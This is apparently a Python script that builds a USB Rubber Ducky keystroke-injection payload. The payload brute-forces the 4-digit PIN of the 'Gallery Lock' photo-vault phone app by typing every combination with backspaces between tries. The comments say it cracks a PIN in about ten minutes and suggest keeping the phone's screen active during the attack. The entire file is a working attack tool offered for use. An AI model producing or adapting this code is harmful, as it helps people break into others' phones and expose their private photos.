#!/usr/bin/env python

# Skyler Curtis (@deadPix3l)
# 7 NOV 16
# gallery unlock v3

# a simple script for generating a rubber ducky inject.bin file
# this is designed to quickly brute force open those terrible "picture vault" type apps, 
# specifically "gallery lock"

# the key variable is designed to be modified to prioritize certain numbers more if needed
# or to remove any number which may be known not to exist in the key.

# In my testing, using all 10 digits will brute force a 4 digit pin of "9999" in 10 min.
# I recommend changing the screen timeout to keep the phone active duiring this.

key = "0123456789"

def recurse(key,codelen,i=0):
	if i<codelen:
		for x in key:
			if x=='0':
				f.write('\x27\x00')
				f.write('\x00\x20')
			else:
				f.write(bytearray((int(x)+0x1D, 0)))
				f.write('\x00\x20')
			recurse(key,codelen,i+1)
		f.write('\x2a\x00')
		#f.write('\x00\x20')
	else: 
		f.write('\x2a\x00')
		#f.write('\x00\x20')

if __name__ == "__main__":
	with open("inject.bin", "wb") as f:
		# add a delay of 2040ms to allow for drivers to install 
		f.write('\x00\xff\x00\xff\x00\xff\x00\xff')
		recurse(key,4)

